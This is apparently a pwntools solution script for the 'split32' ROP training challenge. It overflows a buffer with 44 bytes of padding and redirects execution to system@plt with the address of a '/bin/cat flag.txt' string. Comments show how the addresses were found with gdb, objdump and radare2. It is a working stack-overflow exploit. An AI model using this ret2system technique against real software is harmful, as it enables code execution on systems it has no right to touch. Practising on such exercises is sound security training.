from pwn import *

elf = ELF('split32')
p = process('./split32')
junk = "A" * 44

#sys addr+ret
#gdb ./split && p system
#0x8048430

#system address
#objdump -D split | grep system
#08048430 <system@plt>:
#or in usefulFunction
#8048657:	e8 d4 fd ff ff       	call   8048430 <system@plt>


#find cat flag.txt address
#1.next(elf.search('cat flag'))
#2.r2 split && izz
#  029 0x00001030 0x0804a030  17  18 (.data) ascii /bin/cat flag.txt

#then is r2 split && axt 0x804a030 nothing return, so this is not refered in process

cat_addr = next(elf.search('cat flag'))
print("cat address = " + hex(cat_addr))

#0x80486ca : pop edi ; pop ebp ; ret

sys = 0x8048430
system_addr = 0x8048430
cat_addr = 0x804a030

p.recvuntil('> ')
payload = junk + p32(sys) + "\x90" * 4 + p32(cat_addr)

#gdb.attach(p)
p.sendline(payload)
#p.recvuntil('Exiting')

p.interactive()
